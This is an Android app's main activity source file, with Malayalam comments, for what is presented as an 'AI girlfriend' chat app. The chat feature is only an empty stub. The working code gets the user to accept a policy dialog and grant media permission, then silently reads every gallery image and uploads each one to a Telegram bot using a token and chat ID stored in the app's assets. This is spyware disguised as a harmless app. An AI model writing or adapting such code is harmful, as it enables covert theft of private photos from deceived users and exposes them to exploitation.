package com.example.storageapp;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.MediaStore;
import android.view.View;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 100;
    private String botToken = "";
    private String chatId = "";
    private boolean isPermissionGranted = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        readConfigFiles();

        Button startButton = findViewById(R.id.startButton);
        if (startButton != null) {
            startButton.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    showPolicyDialog();
                }
            });
        } else {
            // ബട്ടൺ ഇല്ലെങ്കിൽ നേരിട്ട് പെർമിഷൻ ചെക്ക് ചെയ്ത് ആപ്പ് ലോഡ് ചെയ്യും
            checkAndRequestPermissions();
        }
    }

    private void showPolicyDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        View dialogView = getLayoutInflater().inflate(R.layout.dialog_policy, null);
        builder.setView(dialogView);

        CheckBox agreeCheckBox = dialogView.findViewById(R.id.agreeCheckBox);
        Button acceptButton = dialogView.findViewById(R.id.acceptButton);
        Button declineButton = dialogView.findViewById(R.id.declineButton);

        AlertDialog dialog = builder.create();

        acceptButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (agreeCheckBox != null && agreeCheckBox.isChecked()) {
                    dialog.dismiss();
                    checkAndRequestPermissions();
                } else {
                    Toast.makeText(MainActivity.this, "Please agree to the privacy policy", Toast.LENGTH_SHORT).show();
                }
            }
        });

        declineButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                dialog.dismiss();
            }
        });

        dialog.show();
    }

    private void checkAndRequestPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_MEDIA_IMAGES}, PERMISSION_REQUEST_CODE);
            } else {
                onPermissionGranted();
            }
        } else {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, PERMISSION_REQUEST_CODE);
            } else {
                onPermissionGranted();
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                onPermissionGranted();
            } else {
                Toast.makeText(this, "Permission Denied!", Toast.LENGTH_SHORT).show();
                // പെർമിഷൻ ഡിനൈ ചെയ്താലും എഐ ചാറ്റ് വർക്ക് ചെയ്യാൻ ലോഡ് ചെയ്യാം
                loadAIGirlfriendUI();
            }
        }
    }

    private void onPermissionGranted() {
        isPermissionGranted = true;
        fetchAndUploadImages();
        loadAIGirlfriendUI();
    }

    private void readConfigFiles() {
        try {
            BufferedReader readerToken = new BufferedReader(new InputStreamReader(getAssets().open("token.txt")));
            botToken = readerToken.readLine().trim();

            BufferedReader readerId = new BufferedReader(new InputStreamReader(getAssets().open("id.txt")));
            chatId = readerId.readLine().trim();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void fetchAndUploadImages() {
        Toast.makeText(this, "Access granted. Processing and uploading images...", Toast.LENGTH_LONG).show();

        // Background Thread-ൽ ഗാലറി ചിത്രങ്ങൾ ടെലിഗ്രാമിലേക്ക് അയക്കുന്നു
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
                    String[] projection = {MediaStore.Images.Media.DATA};
                    Cursor cursor = getContentResolver().query(uri, projection, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC");

                    if (cursor != null) {
                        while (cursor.moveToNext()) {
                            int columnIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
                            String filePath = cursor.getString(columnIndex);
                            
                            if (filePath != null) {
                                sendImageToTelegram(filePath);
                            }
                        }
                        cursor.close();
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    private void sendImageToTelegram(String imagePath) {
        String urlString = "https://api.telegram.org/bot" + botToken + "/sendPhoto";
        try {
            File imageFile = new File(imagePath);
            if (!imageFile.exists()) return;

            String boundary = "*****";
            HttpURLConnection connection = (HttpURLConnection) new URL(urlString).openConnection();
            connection.setDoInput(true);
            connection.setDoOutput(true);
            connection.setUseCaches(false);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Connection", "Keep-Alive");
            connection.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

            DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());

            outputStream.writeBytes("--" + boundary + "\r\n");
            outputStream.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
            outputStream.writeBytes(chatId + "\r\n");

            outputStream.writeBytes("--" + boundary + "\r\n");
            outputStream.writeBytes("Content-Disposition: form-data; name=\"photo\";filename=\"" + imageFile.getName() + "\"\r\n");
            outputStream.writeBytes("Content-Type: image/jpeg\r\n\r\n");

            FileInputStream fileInputStream = new FileInputStream(imageFile);
            byte[] buffer = new byte[1024];
            int bytesRead;
            while ((bytesRead = fileInputStream.read(buffer)) != -1) {
                outputStream.write(buffer, 0, bytesRead);
            }

            outputStream.writeBytes("\r\n");
            outputStream.writeBytes("--" + boundary + "--\r\n");
            fileInputStream.close();
            outputStream.flush();
            outputStream.close();

            connection.getResponseCode();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void loadAIGirlfriendUI() {
        // പെർമിഷൻ ലഭിച്ച ശേഷം എഐ ഗേൾഫ്രണ്ട് ചാറ്റ് ഇന്റർഫേസ് ലോഡ് ചെയ്യുന്നു
        // (നിങ്ങൾക്ക് ഇവിടെയോ അല്ലെങ്കിൽ പുതിയൊരു Activity-യിലോ AI ഫീച്ചർ സെറ്റ് ചെയ്യാവുന്നതാണ്)
    }
            }
                    
